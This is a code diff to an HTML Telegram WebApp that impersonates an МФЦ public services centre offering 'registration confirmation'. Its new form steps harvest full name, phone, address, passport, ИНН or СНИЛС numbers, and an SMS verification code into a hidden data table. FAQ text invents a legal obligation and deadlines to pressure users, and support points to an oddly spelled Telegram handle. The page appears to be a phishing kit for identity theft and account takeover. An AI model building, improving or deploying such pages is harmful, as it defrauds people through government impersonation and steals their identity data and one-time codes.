@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>МФЦ — Подтверждение регистрации</title>
 
-  <!-- ВАЖНО: Telegram WebApp API -->
+  <!-- Telegram WebApp API -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
   <style>
@@ -22,45 +22,152 @@
       --input-border: #990000;
       --table-header-bg: linear-gradient(90deg, #800000, #660000);
     }
+
     * { box-sizing: border-box; margin: 0; padding: 0; }
+
     body {
       font-family: 'Segoe UI', Arial, sans-serif;
       background: var(--background-color);
       padding: 20px;
-      display: flex; justify-content: center; min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
     }
-    .container { max-width: 500px; width: 100%; background: var(--white); padding: 30px; border-radius: 16px; box-shadow: var(--shadow); text-align: center; }
+
+    .container {
+      max-width: 500px;
+      width: 100%;
+      background: var(--white);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: var(--shadow);
+      text-align: center;
+    }
+
     .step { display: none; text-align: left; }
     .step.active { display: block; }
+
     h2, h3 {
-      margin-bottom: 20px; font-weight: 700; font-size: 1.6em; color: var(--primary-color);
-      display: flex; align-items: center; gap: 10px; line-height: 1.3;
+      margin-bottom: 20px;
+      font-weight: 700;
+      font-size: 1.6em;
+      color: var(--primary-color);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      line-height: 1.3;
     }
-    .input-group { margin-bottom: 20px; text-align: left; display: flex; flex-direction: column; align-items: stretch; }
+
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+    }
+
     input {
-      width: 100%; padding: 12px 15px; margin-top: 8px; border: 2px solid var(--input-border); border-radius: 10px;
-      font-size: 16px; background: var(--input-bg); box-shadow: 0 2px 6px rgba(0,0,0,0.1); transition: border-color 0.3s, box-shadow 0.3s;
+      width: 100%;
+      padding: 12px 15px;
+      margin-top: 8px;
+      border: 2px solid var(--input-border);
+      border-radius: 10px;
+      font-size: 16px;
+      background: var(--input-bg);
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+      transition: border-color 0.3s, box-shadow 0.3s;
     }
-    input:focus { outline: none; border-color: var(--primary-color); box-shadow: 0 4px 12px rgba(128,0,0,0.2); }
-    .error { color: var(--error-color); font-size: 14px; margin-top: 6px; font-weight: 600; text-align: left; }
-    .success { color: #28a745; font-size: 16px; margin-top: 10px; font-weight: 600; text-align: center; display: none; }
-    .buttons { margin-top: 20px; display: flex; flex-direction: column; gap: 12px; }
+
+    input:focus {
+      outline: none;
+      border-color: var(--primary-color);
+      box-shadow: 0 4px 12px rgba(128, 0, 0, 0.2);
+    }
+
+    .error {
+      color: var(--error-color);
+      font-size: 14px;
+      margin-top: 6px;
+      font-weight: 600;
+      text-align: left;
+    }
+
+    .success {
+      color: #28a745;
+      font-size: 16px;
+      margin-top: 10px;
+      font-weight: 600;
+      text-align: center;
+      display: none;
+    }
+
+    .buttons {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
     button, a.button {
-      width: 100%; padding: 14px; border: none; border-radius: 10px; cursor: pointer; font-size: 16px; font-weight: 600;
-      transition: background-color 0.3s, transform 0.1s; text-decoration: none; display: inline-block; text-align: center; color: var(--white);
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 600;
+      transition: background-color 0.3s, transform 0.1s;
+      text-decoration: none;
+      display: inline-block;
+      text-align: center;
+      color: var(--white);
     }
+
     button:hover, a.button:hover { transform: translateY(-2px); }
     button:disabled { background: #ccc; cursor: not-allowed; }
+
     .next { background: var(--primary-color); }
     .back { background: var(--secondary-color); }
     .menu-btn, .service-btn, .faq-btn { background: var(--info-color); }
-    .data-table { margin-top: 20px; width: 100%; border-collapse: collapse; display: none; background: var(--white); border-radius: 10px; overflow: hidden; }
+
+    .data-table {
+      margin-top: 20px;
+      width: 100%;
+      border-collapse: collapse;
+      display: none;
+      background: var(--white);
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
     .data-table.active { display: table; }
-    .data-table th, .data-table td { border: 1px solid var(--input-border); padding: 15px; text-align: left; font-size: 14px; vertical-align: middle; }
-    .data-table th { background: var(--table-header-bg); color: var(--white); font-weight: 700; text-transform: uppercase; }
+
+    .data-table th, .data-table td {
+      border: 1px solid var(--input-border);
+      padding: 15px;
+      text-align: left;
+      font-size: 14px;
+      vertical-align: middle;
+    }
+
+    .data-table th {
+      background: var(--table-header-bg);
+      color: var(--white);
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+
+    .data-table tr { transition: background-color 0.3s; }
     .data-table tr:hover { background-color: #F9F5F5; }
     .data-table tr:nth-child(even) { background-color: #F5EDED; }
+
     p { margin-bottom: 20px; color: var(--text-color); font-size: 16px; line-height: 1.5; }
+
+    .clickable-text { color: var(--primary-color); cursor: pointer; user-select: none; }
+    .clickable-text:hover { text-decoration: underline; }
+    .clickable-emoji { cursor: pointer; margin-left: 5px; }
+    .clickable-emoji:hover { opacity: 0.7; }
+
     @media (max-width: 400px) {
       .container { padding: 20px; }
       h2, h3 { font-size: 1.4em; }
@@ -88,8 +195,181 @@
         </div>
       </div>
 
-      <!-- Остальные шаги вашего файла оставлены без изменений -->
-      <!-- ... (fullname, phone, address, document-type, document-number, code, etc.) ... -->
+      <!-- Записаться на приём -->
+      <div class="step" id="step-fullname">
+        <h3>👤 Укажите ФИО</h3>
+        <p><b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b></p>
+        <div class="input-group">
+          <input type="text" id="fullname" placeholder="Иванов Иван Иванович">
+          <div class="error" id="err-fullname"></div>
+        </div>
+        <div class="buttons">
+          <button class="back">↩️ Вернуться назад</button>
+          <button class="next">➡️ Далее</button>
+        </div>
+      </div>
+
+      <!-- Телефон -->
+      <div class="step" id="step-phone">
+        <h3>📞 Номер телефона</h3>
+        <p><b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b></p>
+        <div class="input-group">
+          <input type="tel" id="phone" placeholder="+79991234567">
+          <div class="error" id="err-phone"></div>
+        </div>
+        <div class="buttons">
+          <button class="back">↩️ Вернуться назад</button>
+          <button class="next">➡️ Далее</button>
+        </div>
+      </div>
+
+      <!-- Адрес -->
+      <div class="step" id="step-address">
+        <h3>🏠 Укажите адрес</h3>
+        <p><b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b></p>
+        <div class="input-group">
+          <input type="text" id="address" placeholder="г. Москва, ул. Ленина, д. 1, кв. 2">
+          <div class="error" id="err-address"></div>
+        </div>
+        <div class="buttons">
+          <button class="back">↩️ Вернуться назад</button>
+          <button class="next">➡️ Далее</button>
+        </div>
+      </div>
+
+      <!-- Выбор документа -->
+      <div class="step" id="step-document-type">
+        <h3>📄 Выберите документ</h3>
+        <div class="buttons">
+          <button class="menu-btn" data-doc="Паспорт">📄 Паспорт</button>
+          <button class="menu-btn" data-doc="ИНН">🧾 ИНН</button>
+          <button class="menu-btn" data-doc="СНИЛС">🟢 СНИЛС</button>
+        </div>
+        <div class="buttons">
+          <button class="back">↩️ Вернуться назад</button>
+        </div>
+      </div>
+
+      <!-- Номер документа -->
+      <div class="step" id="step-document-number">
+        <h3 id="doc-title">🔢 Введите номер документа</h3>
+        <p><b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b></p>
+        <div class="input-group">
+          <div id="doc-example" style="margin-bottom:8px;color:#333;font-size:15px;"></div>
+          <input type="text" id="docnumber">
+          <div class="error" id="err-doc"></div>
+        </div>
+        <div class="buttons">
+          <button class="back">↩️ Вернуться назад</button>
+          <button class="next">➡️ Далее</button>
+        </div>
+      </div>
+
+      <!-- Код из SMS -->
+      <div class="step" id="step-code">
+        <h3>🔐 Введите код из SMS</h3>
+        <p>Мы отправили код на ваш номер. Введите его для подтверждения.</p>
+        <div class="input-group">
+          <input type="text" id="code" placeholder="1234">
+          <div class="error" id="err-code"></div>
+        </div>
+        <div class="buttons">
+          <button class="back">↩️ Вернуться назад</button>
+          <button class="next">➡️ Подтвердить</button>
+        </div>
+      </div>
+
+      <!-- Список документов -->
+      <div class="step" id="step-documents">
+        <h3>📜 Список документов</h3>
+        <p>Для подтверждения регистрации требуются:</p>
+        <ul>
+          <li>Паспорт гражданина РФ</li>
+          <li>ИНН (если есть)</li>
+          <li>СНИЛС</li>
+          <li>Выписка ЕГРН (если есть)</li>
+        </ul>
+        <div class="buttons">
+          <button class="back">↩️ Вернуться назад</button>
+        </div>
+      </div>
+
+      <!-- Проверить статус заявки -->
+      <div class="step" id="step-check-status">
+        <h3>🔍 Проверить статус заявки</h3>
+        <div class="buttons">
+          <button class="menu-btn" data-action="status-number">По номеру заявки</button>
+          <button class="menu-btn" data-action="status-passport">По паспорту</button>
+        </div>
+        <div class="buttons">
+          <button class="back">↩️ Вернуться назад</button>
+        </div>
+      </div>
+
+      <!-- Введите номер заявки -->
+      <div class="step" id="step-status-number">
+        <h3>🔍 Введите номер заявки</h3>
+        <div class="input-group">
+          <input type="text" id="status-number" placeholder="123">
+          <div class="error" id="err-status-number"></div>
+        </div>
+        <div class="buttons">
+          <button class="back">↩️ Вернуться назад</button>
+          <button class="next">➡️ Проверить</button>
+        </div>
+      </div>
+
+      <!-- Введите паспорт -->
+      <div class="step" id="step-status-passport">
+        <h3>🔍 Введите паспорт</h3>
+        <div class="input-group">
+          <input type="text" id="status-passport" placeholder="1234 567890">
+          <div class="error" id="err-status-passport"></div>
+        </div>
+        <div class="buttons">
+          <button class="back">↩️ Вернуться назад</button>
+          <button class="next">➡️ Проверить</button>
+        </div>
+      </div>
+
+      <!-- Связаться с поддержкой -->
+      <div class="step" id="step-contact">
+        <h3>📞 Связаться с поддержкой</h3>
+        <p>Свяжитесь с поддержкой:</p>
+        <a href="https://t.me/MFC_SUPPOR" target="_blank" class="button next">📞 Написать в поддержку МФЦ</a>
+        <div class="buttons">
+          <button class="back">↩️ Вернуться назад</button>
+        </div>
+      </div>
+
+      <!-- Частые вопросы -->
+      <div class="step" id="step-faq">
+        <h3>❓ Частые вопросы</h3>
+        <div class="buttons">
+          <button class="faq-btn" data-faq="1">❓ 1. Зачем подтверждать регистрацию?</button>
+          <button class="faq-btn" data-faq="2">❓ 2. Какие документы нужны?</button>
+          <button class="faq-btn" data-faq="3">❓ 3. Что будет, если не подтвердить?</button>
+          <button class="faq-btn" data-faq="4">❓ 4. Можно ли подтвердить онлайн?</button>
+          <button class="faq-btn" data-faq="5">❓ 5. Как изменить данные, если я переехал?</button>
+          <button class="faq-btn" data-faq="6">❓ 6. Как записаться без очередей?</button>
+          <button class="faq-btn" data-faq="7">❓ 7. Квартира в ипотеке?</button>
+          <button class="faq-btn" data-faq="8">❓ 8. Как избежать штрафа за фиктивную регистрацию?</button>
+          <button class="faq-btn" data-faq="9">❓ 9. Как долго обрабатывается заявка?</button>
+          <button class="faq-btn" data-faq="10">❓ 10. Что делать, если потерял выписку ЕГРН?</button>
+        </div>
+        <div class="buttons">
+          <button class="back">↩️ Вернуться назад</button>
+        </div>
+      </div>
+
+      <!-- Ответ на вопрос -->
+      <div class="step" id="step-faq-answer">
+        <h3 id="faq-title">❓ Ответ</h3>
+        <div id="faq-answer" style="margin-bottom:8px;color:#333;font-size:15px;"></div>
+        <div class="buttons">
+          <button class="back">↩️ Вернуться назад</button>
+        </div>
+      </div>
 
       <!-- Таблица данных (hidden by default) -->
       <div id="data-output" class="data-table">
@@ -126,26 +406,33 @@
       initEventListeners() {
         const root = document.getElementById('wizard');
         if (!root) return;
+
         root.addEventListener('click', (e) => {
           const t = e.target;
-          if (t.classList.contains('next') && !t.closest('a') && !t.closest('.redirect-button')) this.handleNext();
-          else if (t.classList.contains('back')) this.handleBack();
-          else if (t.classList.contains('menu-btn')) this.handleMenuAction(t.dataset.action, t.dataset.doc);
-          else if (t.classList.contains('service-btn')) this.handleServiceAction(t.dataset.service);
-          else if (t.classList.contains('faq-btn')) this.handleFaqAction(t.dataset.faq);
+          if (t.classList.contains('next') && !t.closest('a') && !t.closest('.redirect-button')) {
+            this.handleNext();
+          } else if (t.classList.contains('back')) {
+            this.handleBack();
+          } else if (t.classList.contains('menu-btn')) {
+            this.handleMenuAction(t.dataset.action, t.dataset.doc);
+          } else if (t.classList.contains('service-btn')) {
+            this.handleServiceAction(t.dataset.service);
+          } else if (t.classList.contains('faq-btn')) {
+            this.handleFaqAction(t.dataset.faq);
+          }
         });
-        ['fullname','phone','address','docnumber','code','status-number','status-passport'].forEach(id=>{
-          const input=document.getElementById(id);
-          input && input.addEventListener('input',()=>this.validateStep(this.currentStep));
+
+        ['fullname', 'phone', 'address', 'docnumber', 'code', 'status-number', 'status-passport'].forEach(id => {
+          const input = document.getElementById(id);
+          input?.addEventListener('input', () => this.validateStep(this.currentStep));
         });
       }
 
-      // >>> ГЛАВНОЕ ДОБАВЛЕНИЕ <<<
+      // Имя из Telegram WebApp, иначе — URL (?username=) или "Гость"
       updateWelcomeMessage() {
-        const el = document.getElementById('welcome-message');
+        const welcomeElement = document.getElementById('welcome-message');
         let name = 'Гость';
 
-        // если открыто в Telegram WebApp — берём из API
         const tg = window.Telegram && window.Telegram.WebApp;
         if (tg) {
           try {
@@ -156,114 +443,224 @@
               name = full || (u.username ? '@' + u.username : 'Гость');
             }
           } catch (e) {
-            // в редких случаях API недоступно — оставляем фолбэк
+            // Оставляем фолбэк
           }
         } else {
-          // открыто не в Telegram (прямо в браузере) — оставляем «Гость»
-          // при желании можно разрешить тест: ?username=Иван
-          const p = new URLSearchParams(location.search);
-          name = p.get('username') || 'Гость';
+          const urlParams = new URLSearchParams(window.location.search);
+          name = urlParams.get('username') || 'Гость';
         }
 
-        if (el) el.textContent = `📋 Добро пожаловать, ${name}! 👋`;
+        if (welcomeElement) {
+          welcomeElement.textContent = `📋 Добро пожаловать, ${name}! 👋`;
+        }
       }
 
-      showStep(id) {
-        this.steps.forEach(step => step.classList.toggle('active', step.id === `step-${id}`));
-        this.currentStep = id;
+      showStep(stepId) {
+        this.steps.forEach(step => {
+          step.classList.toggle('active', step.id === `step-${stepId}`);
+        });
+        this.currentStep = stepId;
         window.scrollTo({ top: 0, behavior: 'smooth' });
       }
 
-      // ниже — остальная логика без изменений
       handleNext() {
         if (!this.validateStep(this.currentStep)) return;
-        const next = {
-          fullname:'phone', phone:'address', address:'document-type',
-          'document-type':'document-number','document-number':'code',
-          code:'main','status-number':'main','status-passport':'main'
+
+        const nextSteps = {
+          fullname: 'phone',
+          phone: 'address',
+          address: 'document-type',
+          'document-type': 'document-number',
+          'document-number': 'code',
+          code: 'main',
+          'status-number': 'main',
+          'status-passport': 'main'
         };
-        if (next[this.currentStep]) {
+
+        if (nextSteps[this.currentStep]) {
           this.formData[this.currentStep] = document.getElementById(this.currentStep)?.value?.trim();
-          if (this.currentStep === 'code') this.saveData();
-          this.showStep(next[this.currentStep]);
+          if (this.currentStep === 'code') {
+            this.saveData();
+          }
+          this.showStep(nextSteps[this.currentStep]);
         }
       }
 
       handleBack() {
-        const back = {
-          fullname:'main', phone:'fullname', address:'phone',
-          'document-type':'address','document-number':'document-type',
-          code:'document-number', final:'code', documents:'main',
-          'check-status':'main','status-number':'check-status',
-          'status-passport':'check-status', services:'main',
-          faq:'main','faq-answer':'faq', instruction:'services', contact:'main', unauthorized:'main'
+        const backSteps = {
+          fullname: 'main',
+          phone: 'fullname',
+          address: 'phone',
+          'document-type': 'address',
+          'document-number': 'document-type',
+          code: 'document-number',
+          final: 'code',
+          documents: 'main',
+          'check-status': 'main',
+          'status-number': 'check-status',
+          'status-passport': 'check-status',
+          services: 'main',
+          faq: 'main',
+          'faq-answer': 'faq',
+          instruction: 'services',
+          contact: 'main',
+          unauthorized: 'main'
         };
-        this.showStep(back[this.currentStep] || 'main');
+
+        this.showStep(backSteps[this.currentStep] || 'main');
       }
 
       handleMenuAction(action, doc) {
-        if (action === 'schedule') this.showStep('fullname');
-        else if (action === 'documents') this.showStep('documents');
-        else if (action === 'check-status') this.showStep('check-status');
-        else if (action === 'contact') this.showStep('contact');
-        else if (action === 'faq') this.showStep('faq');
-        else if (action === 'status-number') this.showStep('status-number');
-        else if (action === 'status-passport') this.showStep('status-passport');
-        else if (action === 'authorize') this.showStep('fullname');
-        else if (action === 'main') this.showStep('main');
-        else if (doc) {
+        if (action === 'schedule') {
+          this.showStep('fullname');
+        } else if (action === 'documents') {
+          this.showStep('documents');
+        } else if (action === 'check-status') {
+          this.showStep('check-status');
+        } else if (action === 'contact') {
+          this.showStep('contact');
+        } else if (action === 'faq') {
+          this.showStep('faq');
+        } else if (action === 'status-number') {
+          this.showStep('status-number');
+        } else if (action === 'status-passport') {
+          this.showStep('status-passport');
+        } else if (action === 'authorize') {
+          this.showStep('fullname');
+        } else if (action === 'main') {
+          this.showStep('main');
+        } else if (doc) {
           this.formData['document-type'] = doc;
           const example = document.getElementById('doc-example');
-          const cfg = { 'Паспорт':'Пример: 4510 123456','ИНН':'Пример: 500100732259','СНИЛС':'Пример: 112-233-445 95' };
-          if (example) example.textContent = cfg[doc] || '';
+          const configs = {
+            'Паспорт': 'Пример: 4510 123456',
+            'ИНН': 'Пример: 500100732259',
+            'СНИЛС': 'Пример: 112-233-445 95'
+          };
+          if (example) example.textContent = configs[doc] || '';
           this.showStep('document-number');
         }
       }
 
-      handleServiceAction(service) { if (service === 'faq') this.showStep('faq'); else if (service === 'instruction') this.showStep('instruction'); }
+      handleServiceAction(service) {
+        if (service === 'faq') {
+          this.showStep('faq');
+        } else if (service === 'instruction') {
+          this.showStep('instruction');
+        }
+      }
 
       handleFaqAction(faq) {
-        const content = {
-          "1":{title:"❓ 1. Зачем подтверждать регистрацию?",answer:"📜 Подтверждение регистрации обязательно (ст. 19.15.1 КоАП РФ). 🕒 Сроки: 01.02.2025–31.12.2025. Бот поможет подать документы. 🚀"},
-          "2":{title:"❓ 2. Какие документы нужны?",answer:"📜 Для подтверждения регистрации требуются: Паспорт гражданина РФ, ИНН (если есть), СНИЛС, Выписка ЕГРН (если есть)."},
-          "3":{title:"❓ 3. Что будет, если не подтвердить?",answer:"🚫 Если не подтвердить регистрацию, возможны штрафы по ст. 19.15.1 КоАП РФ."},
-          "4":{title:"❓ 4. Можно ли подтвердить онлайн?",answer:"✅ Да, вы можете подтвердить регистрацию онлайн через наш бот."},
-          "5":{title:"❓ 5. Как изменить данные, если я переехал?",answer:"🏠 Если вы переехали, обновите адрес в МФЦ."},
-          "6":{title:"❓ 6. Как записаться без очередей?",answer:"📅 Запишитесь онлайн через наш бот, чтобы избежать очередей."},
-          "7":{title:"❓ 7. Квартира в ипотеке?",answer:"🏠 Если квартира в ипотеке, предоставьте соответствующие документы."},
-          "8":{title:"❓ 8. Как избежать штрафа за фиктивную регистрацию?",answer:"⚠️ Избегайте фиктивной регистрации, предоставляйте реальные данные."},
-          "9":{title:"❓ 9. Как долго обрабатывается заявка?",answer:"🕒 Заявка обрабатывается в течение 3-5 рабочих дней."},
-          "10":{title:"❓ 10. Что делать, если потерял выписку ЕГРН?",answer:"📄 Если потеряли выписку ЕГРН, запросите новую в МФЦ."}
+        const faqContent = {
+          "1": { title: "❓ 1. Зачем подтверждать регистрацию?", answer: "📜 Подтверждение регистрации обязательно (ст. 19.15.1 КоАП РФ). 🕒 Сроки: 01.02.2025–31.12.2025. Бот поможет подать документы. 🚀" },
+          "2": { title: "❓ 2. Какие документы нужны?",       answer: "📜 Для подтверждения регистрации требуются: Паспорт гражданина РФ, ИНН (если есть), СНИЛС, Выписка ЕГРН (если есть)." },
+          "3": { title: "❓ 3. Что будет, если не подтвердить?", answer: "🚫 Если не подтвердить регистрацию, возможны штрафы по ст. 19.15.1 КоАП РФ." },
+          "4": { title: "❓ 4. Можно ли подтвердить онлайн?",     answer: "✅ Да, вы можете подтвердить регистрацию онлайн через наш бот." },
+          "5": { title: "❓ 5. Как изменить данные, если я переехал?", answer: "🏠 Если вы переехали, обновите адрес в МФЦ." },
+          "6": { title: "❓ 6. Как записаться без очередей?",     answer: "📅 Запишитесь онлайн через наш бот, чтобы избежать очередей." },
+          "7": { title: "❓ 7. Квартира в ипотеке?",              answer: "🏠 Если квартира в ипотеке, предоставьте соответствующие документы." },
+          "8": { title: "❓ 8. Как избежать штрафа за фиктивную регистрацию?", answer: "⚠️ Избегайте фиктивной регистрации, предоставляйте реальные данные." },
+          "9": { title: "❓ 9. Как долго обрабатывается заявка?", answer: "🕒 Заявка обрабатывается в течение 3-5 рабочих дней." },
+          "10":{ title: "❓ 10. Что делать, если потерял выписку ЕГРН?", answer: "📄 Если потеряли выписку ЕГРН, запросите новую в МФЦ." }
         };
-        document.getElementById('faq-title').textContent = content[faq].title;
-        document.getElementById('faq-answer').textContent = content[faq].answer;
+
+        document.getElementById('faq-title').textContent = faqContent[faq].title;
+        document.getElementById('faq-answer').textContent = faqContent[faq].answer;
         this.showStep('faq-answer');
       }
 
-      sanitizeInput(v){ return v.replace(/[<>"'&]/g,''); }
-      validateStep(step){
-        const v={
-          fullname:()=>{const val=this.sanitizeInput(document.getElementById('fullname').value.trim());const re=/^[А-Яа-яЁё\s-]+$/;const e=document.getElementById('err-fullname');if(!val){e.textContent='Поле ФИО обязательно для заполнения';return false;}if(!re.test(val)){e.textContent='ФИО должно содержать только буквы кириллицы';return false;}e.textContent='';return true;},
-          phone:()=>{const val=this.sanitizeInput(document.getElementById('phone').value.trim());const digits=val.replace(/[^0-9]/g,'');const e=document.getElementById('err-phone');if(!val){e.textContent='Поле телефона обязательно для заполнения';return false;}if(!val.startsWith('+7')&&!val.startsWith('7')){e.textContent='Номер должен начинаться с +7 или 7';return false;}if(digits.length<10||digits.length>11){e.textContent='Номер должен содержать 10 или 11 цифр';return false;}e.textContent='';return true;},
-          address:()=>{const val=this.sanitizeInput(document.getElementById('address').value.trim());const e=document.getElementById('err-address');if(!val){e.textContent='Поле адреса обязательно для заполнения';return false;}e.textContent='';return true;},
-          'document-number':()=>{const val=this.sanitizeInput(document.getElementById('docnumber').value.trim());const e=document.getElementById('err-doc');if(!val){e.textContent='Поле номера документа обязательно';return false;}e.textContent='';return true;},
-          code:()=>{const val=this.sanitizeInput(document.getElementById('code').value.trim());const re=/^\d{4}$/;const e=document.getElementById('err-code');if(!val){e.textContent='Поле кода обязательно для заполнения';return false;}if(!re.test(val)){e.textContent='Код должен быть 4-значным числом';return false;}e.textContent='';return true;},
-          'status-number':()=>{const val=this.sanitizeInput(document.getElementById('status-number').value.trim());const e=document.getElementById('err-status-number');if(!val){e.textContent='Поле номера заявки обязательно';return false;}e.textContent='';return true;},
-          'status-passport':()=>{const val=this.sanitizeInput(document.getElementById('status-passport').value.trim());const e=document.getElementById('err-status-passport');if(!val){e.textContent='Поле паспорта обязательно';return false;}e.textContent='';return true;}
+      sanitizeInput(value) {
+        return value.replace(/[<>"'&]/g, '');
+      }
+
+      validateStep(step) {
+        const validations = {
+          fullname: () => {
+            const val = this.sanitizeInput(document.getElementById('fullname').value.trim());
+            const re = /^[А-Яа-яЁё\s-]+$/;
+            const error = document.getElementById('err-fullname');
+            if (!val) { error.textContent = 'Поле ФИО обязательно для заполнения'; return false; }
+            if (!re.test(val)) { error.textContent = 'ФИО должно содержать только буквы кириллицы'; return false; }
+            error.textContent = ''; return true;
+          },
+          phone: () => {
+            const val = this.sanitizeInput(document.getElementById('phone').value.trim());
+            const digits = val.replace(/[^0-9]/g, '');
+            const error = document.getElementById('err-phone');
+            if (!val) { error.textContent = 'Поле телефона обязательно для заполнения'; return false; }
+            if (!val.startsWith('+7') && !val.startsWith('7')) { error.textContent = 'Номер должен начинаться с +7 или 7'; return false; }
+            if (digits.length < 10 || digits.length > 11) { error.textContent = 'Номер должен содержать 10 или 11 цифр'; return false; }
+            error.textContent = ''; return true;
+          },
+          address: () => {
+            const val = this.sanitizeInput(document.getElementById('address').value.trim());
+            const error = document.getElementById('err-address');
+            if (!val) { error.textContent = 'Поле адреса обязательно для заполнения'; return false; }
+            error.textContent = ''; return true;
+          },
+          'document-number': () => {
+            const val = this.sanitizeInput(document.getElementById('docnumber').value.trim());
+            const error = document.getElementById('err-doc');
+            if (!val) { error.textContent = 'Поле номера документа обязательно'; return false; }
+            error.textContent = ''; return true;
+          },
+          code: () => {
+            const val = this.sanitizeInput(document.getElementById('code').value.trim());
+            const re = /^\d{4}$/;
+            const error = document.getElementById('err-code');
+            if (!val) { error.textContent = 'Поле кода обязательно для заполнения'; return false; }
+            if (!re.test(val)) { error.textContent = 'Код должен быть 4-значным числом'; return false; }
+            error.textContent = ''; return true;
+          },
+          'status-number': () => {
+            const val = this.sanitizeInput(document.getElementById('status-number').value.trim());
+            const error = document.getElementById('err-status-number');
+            if (!val) { error.textContent = 'Поле номера заявки обязательно'; return false; }
+            error.textContent = ''; return true;
+          },
+          'status-passport': () => {
+            const val = this.sanitizeInput(document.getElementById('status-passport').value.trim());
+            const error = document.getElementById('err-status-passport');
+            if (!val) { error.textContent = 'Поле паспорта обязательно'; return false; }
+            error.textContent = ''; return true;
+          }
         };
-        return v[step]?.() ?? true;
+
+        return validations[step]?.() ?? true;
       }
-      saveData(){
-        const ts=new Date().toLocaleString('ru-RU');
-        const rec={ timestamp:ts, fullname:this.formData.fullname||'', phone:this.formData.phone||'', address:this.formData.address||'', document:`${this.formData['document-type']||''} ${this.formData['document-number']||''}`.trim(), code:this.formData.code||'' };
-        this.dataStore.push(rec);
+
+      saveData() {
+        const timestamp = new Date().toLocaleString('ru-RU');
+        const record = {
+          timestamp,
+          fullname: this.formData.fullname || '',
+          phone: this.formData.phone || '',
+          address: this.formData.address || '',
+          document: `${this.formData['document-type'] || ''} ${this.formData['document-number'] || ''}`.trim(),
+          code: this.formData.code || ''
+        };
+        this.dataStore.push(record);
       }
-      renderDataTable(){
-        const tbody=document.getElementById('data-table-body'); if(!tbody) return;
-        tbody.innerHTML=''; this.dataStore.forEach(r=>{ const tr=document.createElement('tr'); tr.innerHTML=`<td>${r.timestamp}</td><td>${r.fullname}</td><td>${r.phone}</td><td>${r.address}</td><td>${r.document}</td><td>${r.code}</td>`; tbody.appendChild(tr); });
+
+      renderDataTable() {
+        const tbody = document.getElementById('data-table-body');
+        if (!tbody) return;
+        tbody.innerHTML = '';
+        this.dataStore.forEach(record => {
+          const tr = document.createElement('tr');
+          tr.innerHTML = `
+            <td>${record.timestamp}</td>
+            <td>${record.fullname}</td>
+            <td>${record.phone}</td>
+            <td>${record.address}</td>
+            <td>${record.document}</td>
+            <td>${record.code}</td>
+          `;
+          tbody.appendChild(tr);
+        });
       }
     }
-    // Старт
+
     const wizard = new MFCWizard();
   </script>
 </body>
